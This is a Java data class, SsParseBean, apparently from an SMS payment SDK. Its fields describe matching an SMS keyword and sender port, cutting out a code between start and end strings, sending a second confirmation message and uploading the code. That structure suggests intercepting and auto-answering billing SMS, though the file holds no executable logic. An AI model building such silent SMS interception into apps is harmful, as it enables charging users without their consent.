package com.y7.smspay.sdk.ss;

public class SsParseBean {
	private boolean hasUploadCode = false;

	private String secondType = null;
	private String secondPort = null;
	private String secondMsg = null;

	private String capCode = null; // 关键字
	private String capPort = null;// 关键端口
	private String startWord = null; // 开始截取字符串
	private String endWord = null;// 结束截取字符串
	private int direction = 1; // 0向后 1向前

	public boolean isHasUploadCode() {
		return hasUploadCode;
	}

	public void setHasUploadCode(boolean hasUploadCode) {
		this.hasUploadCode = hasUploadCode;
	}

	public String getSecondType() {
		return secondType;
	}

	public void setSecondType(String secondType) {
		this.secondType = secondType;
	}

	public String getSecondPort() {
		return secondPort;
	}

	public void setSecondPort(String secondPort) {
		this.secondPort = secondPort;
	}

	public String getSecondMsg() {
		return secondMsg;
	}

	public void setSecondMsg(String secondMsg) {
		this.secondMsg = secondMsg;
	}

	public String getCapCode() {
		return capCode;
	}

	public void setCapCode(String capCode) {
		this.capCode = capCode;
	}

	public String getCapPort() {
		return capPort;
	}

	public void setCapPort(String capPort) {
		this.capPort = capPort;
	}

	public String getStartWord() {
		return startWord;
	}

	public void setStartWord(String startWord) {
		this.startWord = startWord;
	}

	public String getEndWord() {
		return endWord;
	}

	public void setEndWord(String endWord) {
		this.endWord = endWord;
	}

	public int getDirection() {
		return direction;
	}

	public void setDirection(int direction) {
		this.direction = direction;
	}

	@Override
	public String toString() {
		return "SmsParseBean [hasUploadCode=" + hasUploadCode + ", secondType="
				+ secondType + ", secondPort=" + secondPort + ", secondMsg="
				+ secondMsg + ", capCode=" + capCode + ", capPort=" + capPort
				+ ", startWord=" + startWord + ", endWord=" + endWord
				+ ", direction=" + direction + "]";
	}

}
